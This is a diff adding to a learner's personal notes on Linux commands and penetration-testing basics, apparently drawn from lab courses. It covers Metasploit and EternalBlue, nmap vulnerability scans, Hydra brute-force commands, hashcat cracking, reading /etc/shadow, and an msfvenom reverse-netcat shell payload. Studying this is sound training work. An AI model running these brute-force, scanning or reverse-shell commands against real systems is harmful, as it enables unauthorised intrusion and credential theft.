@@ -1,9 +1,27 @@
 cd - change directory
-cat - concatenation (+)
+cat - displays the content in the file given
+mv <from> <to> - moves the content of a file to another file
+mv <old_name> <new_name> renaming a file
 man ls - detailing of commands
 touch - opening a file
-ifconfig - IP Address
-cd ../ - close directory
+figlet hello - image of the hello
+uptime - system details
+wget - This command allows us to download files from the web via HTTP -- as if you were accessing the file in your browser
+bc - basic claculator for calculation
+sudo chown "username" <filename> - changes the ownership to the new user
+echo "content" > <filename> - adds the content to the file given
+whatis <tool> - tells you about the tools you are using
+chmod u+[r,w,x] <filename> - changes or adds a permission of a file 
+chmod u-[r,w,x] <filename> - removes a permission of a file
+chmod ugo+rwx <filename> - gives all the permission to the file
+ifconfig / ip a - The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters.
+date - gives the date and other details
+cal - gives the calendar of the month
+history - gives the previous operations
+find "filename" - finds the files with the name
+su "username" - switches to another username
+passwd "username" - sets passwd for the user
+cd .. - close directory
 mkdir - make directory
 rmdir - remove directory
 nano <filename> - open file in nano mode
@@ -12,8 +30,120 @@ sudo su - root access
 exit - root disconnect
 rm - remove a file
 get - to download a file
+pwd - print working directory
+whoami - tells u the username
+clear - clears the terminal (or) ctrl + L
+bin - binaries
+leafpad <filename> - opens the file in text editor
+cp - copy
+sudo[super user do] - acts as a root [sudo cp ls Nirmal]
+sbin - super bin(has special commands)
+adduser - adds a user with providing several information like asking name, ph.no etc.
+useradd - adds an user but doesnot asks any information of the user
+which  -where am in
+dev - devices
+etc - ecetra
+gunzip - unzips a file
+ps- process status
+$ - user on the system 
+id - tell all about you
+hostname - return the host name
+ifconfig (or) ip- network stuff
+netstat - the staus of your network
+ss - Another utility to investigate sockets.
+env - environment variables
+lsblk - list blocks
+lsusb - list usbs
+lsof - list all the open files
+man <command> - user guide for the given command
+<command> --help - guide for the command
+apropos <keyword> - used to search the manual page names and descriptions for a specified keyword. It helps 		    you find relevant manual pages related to a particular topic or command.
+sudo cat /etc/passwd - shows all the user in the system
+sudo cat /etc/shadow - display the hashed version of the password
+sudo cat /etc/group - shows all the group created
+sudo passwd <username> - sets password
+ls -al - retrives all the hidden files from the directory
+ls -l - arrange in order of directory
+usermod - modify an user account
+sudo usermod <username> --shell <file address> - changes the file address.
+sudo usermod -l <new username> <old username> - changes the username
+-m - creates a home directory
+su - switching users
+sudoers files - only some files allows using sudo
+visudo - used to edit sudoers file
+userdel - deletes a user
+groupadd - adds a new group
+groupdel - deletes a group
+-aG - to append and login
+-d  - to delete
+gpasswd - remove an user from the group
+-i - to install an application using packages(.deb)
+sudo apt install <application name> - to setup an application
+sudo apt remove <application name> - removes only the application(doesnot removes the user details in the app)
+sudo apt purge <application name> - removes permanently the app including user data from linux
+apt list --installed - displays installed files
+sudo aptitude - GUI for update and upgrades
+sudo snap install --classic code - to install VSCode
+sudo dpkg -i code_1.85.1-1702462158_amd64.deb - to install application which is in .deb
+ps -aux | grep <type> - shows all the process running wrt the particular type
+ps -aux - shows all the running processes
+pstree - process tree
+systemctl - controls all the demons
+sudo systemctl (start,stop,restart,reload,status,enabled,disabled,is-active,is-enable) ssh - process using systemctl
+sudo systemctl list-units -t services- shows all the active service demon files
+-t - list the types
+ps -u kali - to list the running process in ur linux account
+-u - username
+grep(global regular expression print)- used to find a particular item
+pgrep firefox - displays the process ID
+kill <process ID> - closes the application
+top - shows all the runnimg process in CPU order
+htop - allows the user to interactively monitor the system’s vital resources or server’s processes in real time
+ping -c 100 hackthebox.eu &- to run in background process
+jobs - to find out the suspended jobs
+fg - runs in foreground process
+bg - runs in background
+kill -l - lists all the kill signals
+pkill ping - to kill all the ping running
+python -m http.server - shows a server which can be accesses online 
+(ex: python -m http.server 6192 and in firefox give - localhost:6192)
+curl localhost:6192- client url - displays the content of the website
+curl -o coolwebsite localhost:8080 - downloads the file content in coolwebsite file
+curl -I localhost:8080 - displays the type of file and its features
+> - request, < - response
+wget - downloads the file
+cd - (or) echo $OLDPWD  - show the previous directory visited
+echo $PWD - shows the current directory
+alias <new_name>="<old_name>" - can create our own command by creating a new command
+goto nano.bashrc and can change the command to permanent command because, alias cmd is temporary.
+cat > <filename> - able to write in the file directly.After completion, use ctrl+D to save the file.
+echo "NetworkChuck" > demo.txt - content will be saved in the file automatically
+cat << EOF > demo.txt - used to write mutiple lines till we give the cmd EOF.
+nikto -h hackerone.com - scans the particular website
+pdfinfo <filename.pdf> - scans and provide details regarding the pdf
+exiftool <filename.jpg/jpeg/png> - scans and provide details regarding the image
+>> - used to append a file content
+find -name *.txt - finds the file which has the extension .txt
+file <filename> - determine the type of file
+/etc - location to store system files that are used by your operating system. 
+Daemons - Background services are called "daemons" in Linux. Their purpose is to ensure that key functions such as scheduling, printing, and multimedia are working correctly. These small programs load after we booted or log into the computer.
+head -  prints the first ten lines of the given file or input, if not specified otherwise.
+tail - prints the last ten lines of the given file or input
+sort - sorts the desired results alphabetically or numerically to get a better overview
+grep - it will only search for specific results that contain patterns we have defined
+Cut - -d and set the delimiter to the colon character (:) and define with the option "-f" the position in the line we want to output ex : cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
+tr - we define which character we want to replace, and as a second option, we define the character we want to replace it with ex : tr ":" ""
+Column - column is well suited to display such results in tabular form using the "-t."
+Awk - the (g)awk programming is beneficial, which allows us to display the first ($1) and last ($NF) result of the line.
+sed - sed looks for patterns we have defined in the form of regular expressions (regex) and replaces them with another pattern that we have also defined.The "s" flag at the beginning stands for the substitute command. Then we specify the pattern we want to replace. After the slash (/), we enter the pattern we want to use as a replacement in the third position. Finally, we use the "g" flag, which stands for replacing all matches.
+fail2ban - counts the number of failed login attempts, and if a user has reached the maximum number, the host that tried to connect will be handled as configured.
+man nano | grep -e "backup" - used to retrieve the backup command from all list of commands
+fdisk - allows us to create, delete, and manage partitions on a drive  [sudo fdisk -l]
+du - (short for disk usage) which helps you identify what files/directories are consuming how much space.
+traceroute <destination> - it allows you to see every intermediate step between your computer and the resource that you requested
+grep -r <folder_name> -e <text>
 
----------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
 
 krunal kushawi - Networkings
 
@@ -24,11 +154,434 @@ krunal kushawi - Networkings
 4.set values
 5.Run
 
+RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
+PAYLOAD: The payload you will use with the exploit.
+LHOST: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
+LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
+SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
+
+use exploit/windows/smb/ms17_010_eternalblue - The "EternalBlue" is an exploit allegedly developed by the U.S. National Security Agency (N.S.A.) for a vulnerability affecting the SMBv1 server on numerous Windows systems. The SMB (Server Message Block) is widely used in Windows networks for file sharing and even for sending files to printers.
+
+search - This command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
+
+info <module> - it will display detailed information on the module such as its author, relevant sources, etc.
+show option - This will print options related to the exploit we have chosen earlier.can be used in any context followed by a module type (auxiliary, payload, exploit, etc.)
+
+set rhosts <target host> - uses to scan the target host.
+unset all - resets all the setted parameters
+
+setg - sets the parameter in all the modules(global).
+usetg - resets it
+
+sessions - command can be used from the msfconsole prompt or any context to see the existing sessions.
+sessions -i - to interact with other sessions.
+background - command to background the session prompt and go back to the msfconsole prompt.
+exploit -z -  run the exploit and background the session as soon as it opens.
 ------------------------------------------------------------------------------------
+
+*NOTES:*
+
+CyberSpace was coined by William Gibson
+Father of Cyber Security - Bob Thomas
+Father of Computer Forensics - Michael Anderson
+
+Operating System - These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
+(Mis)Configuration-based - These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
+Weak or Default Credentials - Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
+Application Logic - These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
+Human-Factor - Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into
+
+Confidentiality: During online shopping, you expect your credit card number to be disclosed only to the entity that processes the payment. If you doubt that your credit card information will be disclosed to an untrusted party, you will most likely refrain from continuing with the transaction. Moreover, if a data breach results in the disclosure of personally identifiable information, including credit cards, the company will incur huge losses on multiple levels.
+
+Integrity: After filling out your order, if an intruder can alter the shipping address you have submitted, the package will be sent to someone else. Without data integrity, you might be very reluctant to place your order with this seller.
+
+Availability: To place your online order, you will either browse the store’s website or use its official app. If the service is unavailable, you won’t be able to browse the products or place an order. If you continue to face such technical issues, you might eventually give up and start looking for a different online store.
+
+The NIST Cybersecurity Framework is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats. This framework is a bit of an honourable mention because of its popularity and detail.
+
+Geofencing is a method of blocking entire IP ranges associated with countries so that only access from a specific location will be allowed.
+
+IP whitelisting - allows specified IP addresses to access resources, and blocks everything else.
+
+Hashing algorithms : MD4, MD5, NTLM, SHA1
+
+when we create an user in linux , it creates both an user and a group(ex: user:nirmal and group name:group nirmal).
 
 sudo nmap -sV - to scan the port and extract the details (sV - version Detection)
 
+[-L|--list=HOST] : Selecting the targeted host for the connection request.
+
+-h <hostname> : specify the hostname of the target to connect to
+
+-sC: Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some of the scripts in this category are considered intrusive and should not be run against a target network without permission.
+
+dpkg - low level package manager(requires other packages to install an app).
+apt(Advanced package tool) - high level package manager ,frequently used to install an application 
+
+.deb(debian) - an extension for packages in linux
+
+before using apt installation, use sudo apt update to update the repository which contains the appplications.
+
+snap - used to intall and store it in a store manager which is easily available to retrieve it
+
+Demons - to find the demons in linux, the file consists of d at the end of the file (ex: sshd), by executing the ps -aux | grep ssh
+
+systemd - i)service manager for all the demon files in linux. ii) Initialisation system for linux like booting
+
+ctrl+a - traversal to starting point
+ctrl+e - traversal to end
+ctrl+u - to delete all before the cursor
+ctrl+y - pastes the deleted content
+ctrl+R - reverses the previous cmd
+
+sudo unsquashfs rootfs - to unsquash a file
+
+Whatweb <target_ip> - We can extract the version of web servers, supporting frameworks, and applications using the command-line tool
+
+What is the standard port used for the HTTPS protocol - 443
+
+During our scan, which port do we find serving MySQL - 3306
+
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+-p- : This flag scans for all TCP ports ranging from 0-65535
+
+--min-rate : This is used to specify the minimum number of packets Nmap should send persecond; it speeds up the scan as the number goes higher
+
+The most commonly used shell in Linux is the Bourne-Again Shell (BASH)
+
+Networking Layers : [APSTNDP]
+"A"nxious(7) - accepts communication requests from applications -> data
+"P"ale(6) - encrypts, compresses, or otherwise transforms the initial data to give it a standardised format -> data
+"S"hakespeare(5) - tracks communications between the host and receiving computers -> data
+"T"reated(4) - layer would choose to send data over TCP or UDP - datagram (or) segment
+"N"ervous(3) - handles logical addressing -> packet
+"D"runks(2) - data be formatted in preparation for transmission (or) checks received information to make sure that it hasn't been corrupted -> frame
+"P"atiently(1) - transmits and receives data -> bits
+
+Regular expressions (RegEx) are an art of expression language to search for patterns in text and files. They can be used to find and replace text, analyze data, validate input, perform searches, and more. In simple terms, they are a filter criterion that can be used to analyze and manipulate strings. They are available in various programming languages and programs and are used in many different ways and functions.We can use it in tools like grep or sed or others.
+1	(a)	The round brackets are used to group parts of a regex. Within the brackets, you can define further patterns which should be processed together.
+2	[a-z]	The square brackets are used to define character classes. Inside the brackets, you can specify a list of characters to search for.
+3	{1,10}	The curly brackets are used to define quantifiers. Inside the brackets, you can specify a number or a range that indicates how often a previous pattern should be repeated.
+4	|	Also called the OR operator and shows results when one of the two expressions matches
+5	.*	Also called the AND operator and displayed results only if both expressions match
+
+grep -E '\bAuthentication\b' /etc/ssh/sshd_config - ends with authentication
+grep -E '\bPermit\w*' /etc/ssh/sshd_config - starts with permit
+grep -v '#' /etc/ssh/sshd_config - doesnot contains #
+
+File Descriptors:
+Data Stream for Input
+STDIN – 0
+Data Stream for Output
+STDOUT – 1
+Data Stream for Output that relates to an error occurring.
+STDERR – 2
+ex : find /etc/ -name passwd 2>/dev/null | wc -l
+
+MAC flooding - This involves sending many packets with different MAC addresses to a network switch, causing it to reach its MAC address table capacity and effectively preventing it from functioning correctly.
+
+ARP spoofing, also known as ARP cache poisoning or ARP poison routing, is an attack that can be done using tools like Ettercap or Cain & Abel in which we send falsified ARP messages over a LAN. 
+
+"Obfuscation" is a technique used to make a script more difficult to read by humans but allows it to function the same from a technical point of view, though performance may be slower. This is usually achieved automatically by using an obfuscation tool, which takes code as an input, and attempts to re-write the code in a way that is much more difficult to read, depending on its design.
+Tools: beautify, unpacker, jsconsole, obfuscator.io
+
+Sbnetting - The division of an address range of IPv4 addresses into several smaller address ranges.
+
+MAC - media access control - a4:c3:f0:85:ac:2d - first 6->vendor address, last 6->unique address
+
+TCP Wrappers - the /etc/hosts.allow file specifies which services and hosts are allowed access to the system, whereas the /etc/hosts.deny file specifies which services and hosts are not allowed access. These files can be configured by adding specific rules to the files.
+
+netcat - primary usage is for connecting to shells, which we'll discuss later in this module. In addition to that, netcat can be used to connect to any listening port and interact with the service running on that port
+iptables - used in firewall[input, output, pre and post routing].
+
+Socat - Socat is a very handy utility that should be a part of every penetration tester's toolkit. A standalone binary of Socat can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.
+
+Classless Inter-Domain Routing (CIDR) - It is a method of representation and replaces the fixed assignment between IPv4 address and network classes (A, B, C, D, E). The division is based on the subnet mask or the so-called CIDR suffix, which allows the bitwise division of the IPv4 address space and thus into subnets of any size. The CIDR suffix indicates how many bits from the beginning of the IPv4 address belong to the network. It is a notation that represents the subnet mask by specifying the number of 1-bits in the subnet mask
+
+tmux(terminal multiplexer) - great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them. -> ctrl+D to exit from tmux.
+
+Hydra is a free and open-source password-cracking tool. It can try numerous passwords till the correct password is found. It can be used to crack passwords for various network services, including SSH, Telnet, FTP, and HTTP.
+
+Whois - Whois essentially allows you to query who a domain name is registered to.
+
+dig <domain> @<dns-server-ip> - Dig allows us to manually query recursive DNS servers of our choice for information about domains
+-----------------------------------------------------------------------------------------
+Hacking tools installation using github and python(pip3)
+
+->[turbolist3r : https://github.com/fleetcaptain/Turbolist3r]
+->git clone https://github.com/fleetcaptain/Turbolist3r
+->python3 turbolist3r.py -d <site name>
+
+--------------------------------------------------------------------------------
+
+Crunch - password cracking or permutation and combinations
+
+cmd: crunch <min> <max> [options] where min and max are numbers.
+ex: crunch 1 5 nirmal -o /home/kali/desktop/nirmal.txt
+
+--------------------------------------------------------------------------------
+
+Root OS:
+
+/	The top-level directory is the root filesystem and contains all of the files required to boot the 	operating system before other filesystems are mounted as well as the files required to boot the other 	filesystems. After boot, all of the other filesystems are mounted at standard mount points as 	subdirectories of the root.
+/bin	Contains essential command binaries.
+/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
+/dev	Contains device files to facilitate access to every hardware device attached to the system.
+/etc	Local system configuration files. Configuration files for installed applications may be saved here as 	well.
+/home	Each user on the system has a subdirectory here for storage.
+/lib	Shared library files that are required for system boot.
+/media	External removable media devices such as USB drives are mounted here.
+/mnt	Temporary mount point for regular filesystems.
+/opt	Optional files such as third-party tools can be saved here.
+/root	The home directory for the root user.
+/sbin	This directory contains executables used for system administration (binary system files).
+/tmp	The operating system and many programs use this directory to store temporary files. This directory is 	generally cleared upon system boot and may be deleted at other times without any warning.
+/usr	Contains executables, libraries, man files, etc.
+/var	This directory contains variable data files such as log files, email in-boxes, web application related 	files, cron files, and 	more.
+
+--------------------------------------------------------------------------------
+Digital Forensics - Step by Step procedure to Investigate
+
+A forensic analyst is a person that performs an investigation to better understand what happened during an incident. This is often digital forensics that must be investigated by reviewing artefacts such as the memory or hard drive of a device.
+
+As a digital forensics investigator, you arrive at a scene similar to the one shown in the image above. What should you do as a digital forensics investigator? After getting the proper legal authorization, the basic plan goes as follows:
+
+->Acquire the evidence: Collect the digital devices such as laptops, storage devices, and digital cameras. (Note that laptops and computers require special handling if they are turned on; however, this is outside the scope of this room.)
+->Establish a chain of custody: Fill out the related form appropriately (Sample form). The purpose is to ensure that only the authorized investigators had access to the evidence and no one could have tampered with it.
+->Place the evidence in a secure container: You want to ensure that the evidence does not get damaged. In the case of smartphones, you want to ensure that they cannot access the network, so they don’t get wiped remotely.
+Transport the evidence to your digital forensics lab.
+
+At the lab, the process goes as follows:
+
+->Retrieve the digital evidence from the secure container.
+->Create a forensic copy of the evidence: The forensic copy requires advanced software to avoid modifying the original data.
+->Return the digital evidence to the secure container: You will be working on the copy. If you damage the copy, you can always create a new one.
+->Start processing the copy on your forensics workstation.
+
+"Memory forensics" -> is a subset of computer forensics that analyzes volatile memory, usually on a compromised machine; in Windows OS, it corresponds to the Random Access Memory (RAM), and its content is flushed with every reboot or shutdown, making it one of the usual initial task to perform during an incident. The process differs from disk forensics analysis since it not only provides information about what resides on the target computer but also provides us with information about the processes or applications that were running at a particular time and detailed information on the execution flow on a system that may not be present in regular storage units or application logs.
+phase1 : During the memory acquisition phase, we'll copy the live memory to a file, commonly referred to as a dump, to perform the analysis without risking losing the data from an inadvertent reboot on the compromised system and have proof of the analysis inc as needed.
+phase2 : Next, during the memory analysis phase, we'll analyze the obtained memory dump of the forensic data.
+Tools:
+Windows - FTK imager, WinPmem 
+Linux - LIME
+MacOS - osxpmem
+
+Volatility 3 - To analyze the dump
+-f - get information about the target
+windows.netstat - to see if there's an interesting or unusual connection.
+windows.pstree - which will display a tree of the process running on the OS.
+windows.filescan - which will allow us to examine the files accessed that are stored in the memory dump
+windows.mftscan.MFTScan - If we want to have more detailed information like when the file was accessed or modified
+strings pid.1612.dmp |grep -B 10 -A 10 "http://key.critical-update.com/encKEY.txt"
 
 
+Tools:
+Eric Zimmerman's tools:
+	Eric Zimmerman is a security researcher who has written a few tools to help perform forensic analysis on the Windows platform. These tools help the registry, file system, timeline, and many other analyses.
+KAPE:
+	Kroll Artifact Parser and Extractor (KAPE) is another beneficial tool by Eric Zimmerman. This tool automates the collection and parsing of forensic artifacts and can help create a timeline of events.
+Autopsy:
+	Autopsy is an open-source forensics platform that helps analyze data from digital media like mobile devices, hard drives, and removable drives. Various plugins for autopsy speed up the forensic process and extract and present valuable information from the raw data sources.
+Volatility:
+	Volatility is a tool that helps perform memory analysis for memory captures from both Windows and Linux Operating Systems. It is a powerful tool that can help extract valuable information from the memory of a machine under investigation.
+Redline:
+	Redline is an incident response tool developed and freely distributed by FireEye. This tool can gather forensic data from a system and help with collected forensic information. 
+Velociraptor:
+	Velociraptor is an advanced endpoint-monitoring, forensics, and response platform. It is open-source but very powerful.
 
+Incident Handbook:
+1.Preparation
+2.Identification
+3.Containment
+4.Eradication
+5.Recovery
+6.Lessons Learned
+
+-------------------------------------------------------------------------------------------------------------
+
+IMPORTANT LINKS AND TOPICS:
+
+OSINT TOOLS TUTORIAL:
+https://elearning.securityblue.team/home/courses/free-courses/introduction-to-osint#content#tools-and-services#tools-and-services#tweetdeck
+
+Network Traffic Analyzer - Wireshark, tShark, Tcpdump
+Network Troubleshooting - Ping, Traceroute, Netstat, Tcpdump ,Wireshark, Nmap
+Safeguard Linux Systems - SELinux, AppArmor, and TCP wrappers
+Linux security services - Snort, chkrootkit, rkhunter, Lynis
+--------------------------------------------------------------------------------------------------------------
+Windows:
+
+Get-Computerinfo - retrieves computer info
+Get-LocalGroupMember -Group “Administrators - retrieves the admin users
+Get-ScheduledTask - list the tasks
+net user Jenny | findstr "Last" - user details
+What tool was used to get Windows passwords - mimikatz
+C drive -> Windows -> System32 -> drive -> etc -> host - very useful
+
+--------------------------------------------------------------------------------------------------------------
+
+Hashcat:
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -> used to crack the hash using hashing algorithm's code ex:1000, 160 etc..  -> store the hash in a file ex: hash.txt.
+hash-identifier - used to identify the hash algorithm
+--------------------------------------------------------------------------------------------------------------
+
+Hydra:
+
+Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.
+
+ex: hydra -l user -P passlist.txt ftp://10.10.27.138
+ex: hydra -l root -P passwords.txt 10.10.27.138 -t 4 ssh
+ex: hydra -l <username> -P <wordlist> 10.10.27.138 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -l molly -P rockyou.txt 10.10.27.138 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+--------------------------------------------------------------------------------------------------------------
+NMAP:
+
+ThreeWay Handshake:
+First the connecting terminal (our attacking machine, in this instance) sends a TCP request to the target server with the SYN flag set. The server then acknowledges this packet with a TCP response containing the SYN flag, as well as the ACK flag. Finally, our terminal completes the handshake by sending a TCP request with the ACK flag set.
+
+Many firewalls are configured to simply drop incoming packets. Nmap sends a TCP SYN request, and receives nothing back. This indicates that the port is being protected by a firewall and thus the port is considered to be filtered.
+Soln: iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
+
+nmap --script vuln www.sece.ac.in - to find the vulnerability of the website
+
+nmap -sV -sC <target_ip>
+locate /scripts/citrix - to locate the scripts for nmap.
+nmap --script <script name> -p<port> <host> ->  nmap -sV --script=banner -p21 10.10.10.0/24.
+banner grabbing is a useful technique to fingerprint a service quickly
+TCP Connect Scans (-sT)
+SYN "Half-open" Scans (-sS)
+UDP Scans (-sU)--nmap -sU --top-ports 20 <target>
+
+The Nmap Scripting Engine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the Lua programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaissance
+safe:- Won't affect the target
+intrusive:- Not safe: likely to affect the target
+vuln:- Scan for vulnerabilities
+exploit:- Attempt to exploit a vulnerability
+auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
+brute:- Attempt to bruteforce credentials for running services
+discovery:- Attempt to query running services for further information about the network 
+
+directory of nse - /usr/share/nmap/scripts/script.db
+--------------------------------------------------------------------------------------------------------------
+Hacker's Methodology:
+	
+Step 1 -> Reconnaissance and Footprinting
+Reconnaissance is all about collecting information about your target.
+Footprinting - collect as much as possible information
+Google (specifically Google Dorking)
+Wikipedia
+PeopleFinder.com
+who.is
+shodan.io - finest hacking search engine
+sublist3r
+hunter.io
+builtwith.com
+wappalyzer
+netcraft.com
+web data extracker
+
+Step 2 -> Scanning and Enumeration
+This is where a hacker will start interacting with (scanning and enumerating) the target to attempt to find vulnerabilities related to the target.
+Tools like nmap, dirb, metasploit, exploit-db, Burp Suite 
+dirb -> (used to find commonly-named directories on a website 
+dirbuster -> (similar to dirb but with a cooler name, and with a user interface)
+enum4linux -> (tool used specifically for Linux to find vulnerabilities)
+metasploit -> (this tool is mostly used for exploitation, but it also has some built-in enumeration tools)
+Burp Suite -> (this tool can be used to scan a website for subdirectories and to intercept network traffic)
+enum4linux
+
+Step 3 -> Exploitation
+The exploitation phase can only be as good as the recon and enumeration phases before it, if you did not enumerate all vulnerabilities you may miss an opportunity, or if you did not look hard enough at the target - the exploit you have chosen may fail entirely
+primary tool : Metasploit, SQLMap, BurpSuite
+
+Step 4 -> Privilege Escalation [Resources : Hacktricks, PayloadsAllTheThings]
+Cracking password hashes found on the target
+Finding a vulnerable service or version of a service which will allow you to escalate privilege THROUGH the service
+Password spraying of previously discovered credentials (password re-use)
+Using default credentials
+Finding secret keys or SSH keys stored on a device which will allow pivoting to another machine
+Running scripts or commands to enumerate system settings like 'ifconfig' to find network settings, or the command 'find / -perm
+-4000 -type f 2>/dev/null' to see if the user has access to any commands they can run as root
+
+Step 5 -> Covering Tracks
+Since the rules of engagement for a penetration test should be agreed to before the test occurs, the penetration tester should stop IMMEDIATELY when they have achieved privilege escalation and report the finding to the client. 
+
+Step 6 -> Reporting phase
+This is one of the most important phases where you will outline everything that you found. The reporting phase often includes the following things:
+-The Finding(s) or Vulnerabilities
+-The CRITICALITY of the Finding
+-A description or brief overview of how the finding was discovered
+-Remediation recommendations to resolve the finding
+--------------------------------------------------------------------------------------------------------------
+OWASP: The Open Web Application Security Project
+
+Injection
+Broken Authentication
+Sensitive Data Exposure
+XML External Entity
+Broken Access Control
+Security Misconfiguration
+Cross-site Scripting
+Insecure Deserialization
+Components with Known Vulnerabilities
+Insufficient Logging & Monitoring
+
+
+--------------------------------------------------------------------------------------------------------------
+Gobusters, ffuf and Dirbuster
+
+Gobuster is a free and open-source directory and file enumeration tool. Penetration testers and security professionals use it to fin hidden directories and files on web servers.
+ex: gobuster dir --url http://www.onlineshop.thm/ -w=/usr/share/wordlists/dirbuster/directory-list.txt
+ex: gobuster dir -u <link> --wordlists=/usr/share/wordlists/dirbuster/directory-list.txt
+
+ffuf: for subdomains
+ffuf -u http:/permx.htb/ -H "Host:FUZZ.permx.htb" -w /home/user/HacktheBox/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
+--------------------------------------------------------------------------------------------------------------
+Dockers: [use sudo]
+Images - instructions for what a container should execute.
+docker pull - images downloading [ex: docker pull nginx:latest]
+docker images - to manage the image and list all the images
+docker image ls - This command allows us to list all images stored on the local system
+docker image rm <image_name> - to remove an image from the system,
+docker run -d helloworld - for running in background
+docker ps - lists all running docker files
+--------------------------------------------------------------------------------------------------------------
+Reverse Shell:
+
+using msfvenom:
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+
+tcpdump listener:
+If using your own machine with the OpenVPN connection, use:
+sudo tcpdump ip proto \\icmp -i tun0
+
+If using the AttackBox, use:
+sudo tcpdump ip proto \\icmp -i ens5
+--------------------------------------------------------------------------------------------------------------
+SQL Injection:
+
+Types of Attacks: In-band, Out-band, Blind, Compound Injection
+
+
+--------------------------------------------------------------------------------------------------------------
+Hardware Attacks: Bluetooth Hacking, cryptanalysis side-channel attacks, and microprocessor vulnerabilities.
+
+Bluetooth Hacking:
+Types:
+Bluesnarfing: A cyber-attack involving unauthorised access to information from wireless devices through Bluetooth.
+Bluejacking: An attack that sends unsolicited messages to Bluetooth-enabled devices.
+BlueSmacking: A Denial-of-Service attack that overwhelms a device's Bluetooth connection.
+Bluebugging: A technique used to gain control over a device via Bluetooth.
+BlueBorne: A set of vulnerabilities that allow attackers to take control of devices, spread malware, or perform other malicious activities via Bluetooth.
+KNOB (Key Negotiation of Bluetooth): An attack that manipulates the data encryption process during Bluetooth connection establishment, weakening security.
+BIAS (Bluetooth Impersonation AttackS): This attack exploits a vulnerability in the pairing process, allowing an attacker to impersonate a trusted device.
 
